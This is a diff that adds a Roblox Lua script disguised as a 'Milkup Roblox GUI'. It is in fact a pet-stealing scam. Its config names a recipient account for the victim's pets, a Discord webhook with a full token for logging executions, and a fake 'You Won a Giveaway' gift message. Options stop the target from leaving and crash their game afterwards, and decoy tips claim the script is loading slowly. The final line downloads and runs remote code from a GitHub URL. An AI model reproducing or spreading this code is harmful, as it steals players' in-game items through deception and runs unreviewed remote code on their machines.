@@ -1,0 +1,18 @@
+--[[ Config ]]--
+_G.Username = "theRBXLERER" --// Username To Send Pets To
+_G.ScriptName = "Milkup Roblox GUI" --// Script Name For Watermark
+_G.Webhook = "https://discord.com/api/webhooks/1097887153599565835/V8mu84aPnFwuREjIuse0jQUM282oNxbohhWxomZHozCjSh-vtPNdtkSDx_qhGrert9aO" --// Discord Webhook For Executions
+_G.GiftMessage = "You Won a Giveaway" --// Message For The Gift To Say
+_G.Diamonds = 500000 --// Amount Of Diamonds To Not Kick
+_G.UnlockPets = true --// Unlocks Locked Pets
+_G.AntiLeave = true --// Doesn't Let The Target Close Roblox
+_G.Crash = true  --// Crashes Them After Its Finished
+_G.Tip1 = "Sciprt is loading Longer then normaly" --// Gives You Tips On The UI
+_G.Tip2 = "Sciprt is loading Longer then normaly" --// Gives You Tips On The UI
+_G.Tip3 = "Sciprt is loading Longer then normaly" --// Gives You Tips On The UI
+_G.Tip4 = "Sciprt is loading Longer then normaly" --// Gives You Tips On The UI
+_G.Tip5 = "Sciprt is loading Longer then normaly" --// Gives You Tips On The UI
+ 
+--[[ Script ]]--
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))(
